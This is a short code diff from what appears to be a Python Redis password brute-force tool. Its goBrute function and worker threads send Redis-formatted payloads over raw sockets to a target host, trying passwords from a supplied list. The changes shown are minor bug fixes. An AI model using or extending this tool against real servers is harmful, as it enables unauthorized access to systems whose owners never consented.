@@ -66,7 +66,7 @@ class _Run(Thread):
             if passwd.find(pad) > -1 and passwd.rsplit(pad,1)[1] == "":
                 passwd = passwd[:-len(pad)]
             passDict.update({self.thisName:passwd})
-            if passwd != b'':
+            if passwd != '':
                 s = socket(AF_INET, SOCK_STREAM)
                 s.connect(self.host)
                 payload = "".join(_redis_format(*line) for line in [
@@ -78,6 +78,7 @@ class _Run(Thread):
                 s.send(payload)
                 s.close()
             else:
+                waitDict.update({self.thisName:True})
                 return
             sleep(self.waitTime)
         finish = True
@@ -125,7 +126,7 @@ def goBrute(host:str,listenHost:str,listenPorts:list,threadNum:int,passList,wait
             passContent.close()
             exit()
 
-    if result != None:
+    if result is not None:
         print(f"<<< get result -> {result} >>>")
         s = socket(AF_INET, SOCK_STREAM)
         s.connect(tuple(int(each) if each.isalnum() else each for each in host.split(":")))
